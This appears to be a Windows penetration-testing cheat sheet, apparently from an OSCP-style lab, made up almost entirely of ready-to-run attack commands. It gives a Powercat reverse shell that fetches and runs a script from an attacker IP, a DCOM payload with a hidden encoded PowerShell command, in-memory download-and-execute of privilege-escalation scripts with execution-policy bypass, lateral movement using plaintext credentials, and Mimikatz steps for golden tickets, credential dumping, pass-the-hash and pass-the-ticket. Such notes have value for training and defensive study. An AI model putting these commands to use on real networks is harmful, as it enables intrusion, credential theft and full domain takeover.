# Reverse Shells

--------
## Powercat Reverse Shell 

**In memory execution**

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://IP/powercat.ps1');powercat -c IP -p 4444 -e powershell"
```

## DCOM Reverse Shell

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET IP"))
```

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjA...","7")
```

--------
# Enumeration

------
## General

**Look for interesting files**

```powershell
Get-ChildItem -Path C:\Users\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
Get-ChildItem -Path .\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
Get-ChildItem -Path C:\Users\ -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
Get-ChildItem -Path C:\Users\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "File: $($_.Name)"; Get-Content $_.FullName }
```

## Enumerate Scheduled Tasks

**Filter by local users**

```powershell
Get-LocalUser | ForEach-Object { schtasks /query /fo LIST /v | findstr $_.Name }
Get-LocalUser | ForEach-Object { Get-ScheduledTask | findstr $_.Name }
```

**Filter by interesting strings**

```powershell
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Run As User" /C:"Schedule" /C:"Scheduled Task State" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment"
```

**Get all scheduled tasks**

```powershell
schtasks /query /fo LIST /v
```

## Enumerate Services

**All Services**

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

**Filter out C:\\Windows**

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | findstr /v "C:\Windows"
```

## PowerUp.ps1

**In memory execution (works inside reverse shell without PS execution rights)**

```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.186:8000/enum/PowerUp.ps1'); Invoke-AllChecks"
```

## PrivescCheck.ps1

**In memory execution (works inside reverse shell without PS execution rights)**

```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://IP/PrivescCheck.ps1'); Invoke-PrivescCheck"
```

-------
# Movement

-------
## WMI

**Create process on another machine (need Admin on target)**

```powershell
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

## WinRS

**Create process on another machine (need Admin on target)**

```powershell
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
```

---------
# Mimikatz

--------
## Golden Ticket

```js
# privilege::debug
# lsadump::lsa /patch (grab krbtgt ntlm hash and domain SID)
# kerberos::purge
# kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
# misc::cmd
# exit

psexec.exe \\dc1 cmd.exe 
```

> [!warning] `psexec.exe \\192.168.50.70 cmd.exe` would not work. 
> 
> Using `\\192.168.50.70` forces NTLM auth rather than Kerberos (overpass the hash technique), meaning the golden ticket is never actually used for auth

## Logon Passwords

```js
# sekurlsa::logonpasswords
# sekurlsa::pth /user:dave /domain:corp.com /ntlm:08d7a47a6f9f66b97b1bae4178747494 /run:powershell
```

## PTT

```js
# sekurlsa::tickets /export
# kerberos::purge
# kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

PS C:\Tools> klist
PS C:\Tools> ls \\<SPN FROM NAMELIST>\backup
```

> [!warning] The SPN ***must*** match the output of `klist` or else authentication will not work.
> E.g.
> ```js
> Server: cifs/web04 @ CORP.COM
> ```
> The resulting command must be: `ls \\web04\backup`
> 
> Whereas:
> ```js
> Server: cifs/web04.corp.com @ CORP.COM
> ```
> The resulting command must be: `ls \\web04.corp.com\backup`
> 
> This is true for ALL AUTH, whether it is listing a file share or RCE via `psexec` 





